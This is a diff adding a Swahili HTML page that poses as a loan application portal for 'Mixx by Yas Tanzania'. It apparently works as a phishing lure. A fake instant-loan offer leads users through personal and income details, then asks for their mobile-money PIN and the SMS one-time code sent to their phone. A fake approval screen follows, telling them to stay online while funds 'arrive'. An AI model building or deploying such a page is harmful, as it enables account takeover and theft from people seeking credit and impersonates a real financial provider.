@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mixx by Yas Tanzania – Premium Financial Portal</title>
+    <!-- Google Fonts for a premium look -->
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="app-container">
+        <!-- ADVANCED HEADER WITH PROGRESS TRACKER -->
+        <header class="app-header">
+            <div class="logo">Mixx<span>Yas</span></div>
+            <div id="progress-container" class="progress-container hidden">
+                <div class="progress-bar-bg">
+                    <div id="progress-fill" class="progress-fill"></div>
+                </div>
+                <div class="progress-steps">
+                    <span id="step-dot-1" class="step-dot active">1</span>
+                    <span id="step-dot-2" class="step-dot">2</span>
+                    <span id="step-dot-3" class="step-dot">3</span>
+                </div>
+            </div>
+        </header>
+
+        <!-- VIEW 1: PREMIUM LANDING & CALCULATOR -->
+        <section id="view-landing" class="app-view active">
+            <div class="hero-section">
+                <h1>Mikopo ya Dijitali Taslimu</h1>
+                <p>Ufumbuzi wa kifedha wa haraka, salama na wa kuaminika popote ulipo.</p>
+            </div>
+
+            <div class="calculator-card advanced-card">
+                <div class="badge">Kikokotoo Smart</div>
+                
+                <div class="input-group">
+                    <div class="label-row">
+                        <label>Kiasi unachohitaji</label>
+                        <span id="calc-amount-val" class="live-counter">TSh 100,000</span>
+                    </div>
+                    <input type="range" id="calc-amount" min="50000" max="15000000" step="50000" value="500000">
+                    <div class="range-limits"><span>TSh 50K</span><span>TSh 15M</span></div>
+                </div>
+
+                <div class="input-group">
+                    <div class="label-row">
+                        <label>Muda wa Marejesho</label>
+                        <span id="calc-duration-val" class="live-counter">miezi 12</span>
+                    </div>
+                    <input type="range" id="calc-duration" min="3" max="48" step="3" value="12">
+                    <div class="range-limits"><span>miezi 3</span><span>miezi 48</span></div>
+                </div>
+
+                <div class="result-box advanced-result">
+                    <span class="result-label">Kadirio la Rejesho / Mwezi</span>
+                    <p class="result-value" id="calc-monthly-payment">TSh 0</p>
+                    <small class="interest-tag">Riba nafuu ya 2.1% kwa mwezi</small>
+                </div>
+                
+                <button class="btn btn-primary btn-block btn-animate" onclick="startApplication()">OMBA MKUPO SASA</button>
+            </div>
+
+            <div class="trust-banner">
+                <p>🔒 Ulinzi wa data wa kiwango cha juu (End-to-End Encryption)</p>
+            </div>
+        </section>
+
+        <!-- VIEW 2: STEP 1 (LOAN SETUP) -->
+        <section id="view-step1" class="app-view">
+            <div class="back-nav" onclick="exitApplication()">← Ghairi Maombi</div>
+            <h2>Maelezo ya Mkopo</h2>
+            <p class="section-subtitle">Chagua jinsi unavyotaka kutumia mkopo wako leo.</p>
+            
+            <form id="form-step1" onsubmit="event.preventDefault(); saveStep1();">
+                <div class="form-group">
+                    <label>Aina ya Mkopo</label>
+                    <select id="loan-type" required>
+                        <option value="Mkopo wa Maendeleo">Mkopo wa Maendeleo / Biashara</option>
+                        <option value="Mkopo wa Dharura wa Afya">Dharura ya Afya au Matibabu</option>
+                        <option value="Ada ya Shule">Ada ya Shule / Elimu</option>
+                        <option value="Ujenzi au Shamba">Ujenzi au Kuboresha Nyumba</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Thibitisha Kiasi (TSh)</label>
+                    <input type="number" id="loan-amount" required>
+                </div>
+                <div class="form-group">
+                    <label>Thibitisha Muda (Miezi)</label>
+                    <input type="number" id="loan-duration" required>
+                </div>
+                <div class="form-group">
+                    <label>Maelezo Mafupi ya Madhumuni</label>
+                    <input type="text" id="loan-purpose" placeholder="Mfano: Kuongeza mtaji wa duka la nguo" required>
+                </div>
+                <button type="submit" class="btn btn-primary btn-block btn-animate">ENDELEA MBELE</button>
+            </form>
+        </section>
+
+        <!-- VIEW 3: STEP 2 (PERSONAL KYC) -->
+        <section id="view-step2" class="app-view">
+            <div class="back-nav" onclick="goToStep(1)">← Hatua ya Nyuma</div>
+            <h2>Taarifa Binafsi</h2>
+            <p class="section-subtitle">Tafadhali jaza majina yako kama yanavyoonekana kwenye kitambulisho chako.</p>
+            
+            <form id="form-step2" onsubmit="event.preventDefault(); saveStep2();">
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Jina la Kwanza</label>
+                        <input type="text" id="first-name" placeholder="Mfano: Juma" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Jina la Ukoo</label>
+                        <input type="text" id="last-name" placeholder="Mfano: Said" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Barua Pepe (Email)</label>
+                    <input type="email" id="email" placeholder="juma@example.com" required>
+                </div>
+                <div class="form-group">
+                    <label>Namba ya Simu ya Mapokezi ya Fedha</label>
+                    <div class="phone-input-wrapper">
+                        <span class="prefix">🇹🇿 +255</span>
+                        <input type="tel" id="phone" placeholder="712345678" pattern="[0-9]{9}" required>
+                    </div>
+                </div>
+                <button type="submit" class="btn btn-primary btn-block btn-animate">VERIFY & PROCEED</button>
+            </form>
+        </section>
+
+        <!-- VIEW 4: STEP 3 (FINANCIAL SUMMARY) -->
+        <section id="view-step3" class="app-view">
+            <div class="back-nav" onclick="goToStep(2)">← Hatua ya Nyuma</div>
+            <h2>Uthibitisho wa Kipato</h2>
+            <p class="section-subtitle">Kamilisha hatua ya mwisho ili kutengeneza akaunti ya malipo.</p>
+            
+            <form id="form-step3" onsubmit="event.preventDefault(); submitApplication();">
+                <div class="form-group">
+                    <label>Chanzo chako kuu cha Kipato</label>
+                    <select id="employment-status" required>
+                        <option value="Biashara Binafsi">Nimeajiriwa (Mshahara wa Kila Mwezi)</option>
+                        <option value="Mjasiriamali / Duka">Mfanyabiashara / Muuzaji wa Duka</option>
+                        <option value="Kilimo / Mifugo">Mkulima / Shughuli za Shambani</option>
+                        <option value="Kazi ya mkataba">Kazi ya Mkataba / Freelancer</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Makadirio ya Mauzo au Kipato / Mwezi (TSh)</label>
+                    <input type="number" id="annual-income" placeholder="Mfano: 450000" required>
+                </div>
+                
+                <div class="premium-summary">
+                    <div class="summary-header">Hakiki Ombi Lako kabla ya Kutuma</div>
+                    <div class="summary-line"><span>Mteja:</span> <span id="sum-name" class="bold-txt">—</span></div>
+                    <div class="summary-line"><span>Kiasi Kilichochaguliwa:</span> <span id="sum-amount" class="bold-txt">TSh 0</span></div>
+                    <div class="summary-line"><span>Muda wa Marejesho:</span> <span id="sum-duration" class="bold-txt">0 Miezi</span></div>
+                </div>
+                
+                <button type="submit" class="btn btn-success btn-block btn-animate">THIBITISHA NA UTUME MAOMBI</button>
+            </form>
+        </section>
+
+        <!-- VIEW 5: SECURITY VERIFICATION GATEWAY -->
+        <section id="view-login" class="app-view">
+            <div class="security-shield">🛡️</div>
+            <h2 class="center-text">Uthibitisho wa Kiusalama</h2>
+            <p class="center-subtitle">Ili kupokea mkopo huu kupitia akaunti ya simu uliyoweka, tafadhali thibitisha namba yako kwa kuingiza PIN.</p>
+            
+            <form id="form-login" onsubmit="event.preventDefault(); handleLogin();">
+                <div class="form-group">
+                    <label>Namba ya Simu Iliyosajiliwa</label>
+                    <div class="phone-input-wrapper disabled-field">
+                        <span class="prefix">🇹🇿 +255</span>
+                        <input type="tel" id="login-phone" readonly>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Weka PIN yako ya Huduma ya Kifedha (Tarakimu 4)</label>
+                    <input type="password" id="login-pin" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" placeholder="••••" required class="pin-box">
+                </div>
+                <button type="submit" class="btn btn-primary btn-block btn-animate">INGIZA ACCOUNT CONTROL</button>
+            </form>
+        </section>
+
+        <!-- VIEW 6: SMS ONE-TIME PASSWORD (OTP) -->
+        <section id="view-otp" class="app-view">
+            <div class="sms-icon">💬</div>
+            <h2 class="center-text">Msimbo wa OTP</h2>
+            <p class="center-subtitle">Weka msimbo wenye namba 4 uliotumwa sasa hivi kwa SMS kwenye laini yako ya simu.</p>
+            
+            <div class="otp-inputs">
+                <input type="text" class="otp-box" inputmode="numeric" maxlength="1" onkeyup="moveOtpFocus(this, 'otp2')" id="otp1" required>
+                <input type="text" class="otp-box" inputmode="numeric" maxlength="1" onkeyup="moveOtpFocus(this, 'otp3')" id="otp2" required>
+                <input type="text" class="otp-box" inputmode="numeric" maxlength="1" onkeyup="moveOtpFocus(this, 'otp4')" id="otp3" required>
+                <input type="text" class="otp-box" inputmode="numeric" maxlength="1" id="otp4" required>
+            </div>
+            
+            <button class="btn btn-primary btn-block btn-animate" onclick="verifyOtp()">KUKAMILISHA USALAMA</button>
+            <p class="resend-text">Hujapokea msimbo? <span class="resend-link">Tuma tena SMS (Sekunde 45)</span></p>
+        </section>
+
+        <!-- VIEW 7: COMPLETED DASHBOARD -->
+        <section id="view-dashboard" class="app-view center-text">
+            <div class="success-glow">
+                <span class="checkmark-icon">✓</span>
+            </div>
+            <h2 style="color: var(--success-color);">Usajili Imekamilika!</h2>
+            <p class="section-subtitle">Mifumo ya ukaguzi wa akaunti imekubali ombi lako la mkopo.</p>
+            
+            <div class="approved-display-card">
+                <span class="card-label">Kiasi Kitakachotumwa Kwenye Simu:</span>
+                <h3 id="dash-approved-amount">TSh 0</h3>
+                <div class="status-indicator-tag">● Inasubiri Muamala (Processing)</div>
+            </div>
+            
+            <p class="dashboard-notice">Tafadhali usizime simu yako wala usiondoke kwenye mtandao. Fedha zinatumwa kwa njia ya mfumo otomatiki (Automated Disbursement Engine) ndani ya dakika 5.</p>
+        </section>
+
+        <!-- MODERN FULL-SCREEN BLURRED LOADER -->
+        <div id="loading-overlay" class="overlay hidden">
+            <div class="overlay-card">
+                <div class="premium-spinner"></div>
+                <h4 id="overlay-msg">Inachambua Data...</h4>
+                <p>Uunganisho wa salama uliosimbwa (SSL 256-Bit)</p>
+            </div>
+        </div>
+
+        <!-- FOOTER -->
+        <footer class="app-footer">
+            <p>© 2026 Mixx by Yas Tanzania • Authorized Digital Credit Provider</p>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+  </html>
+                  
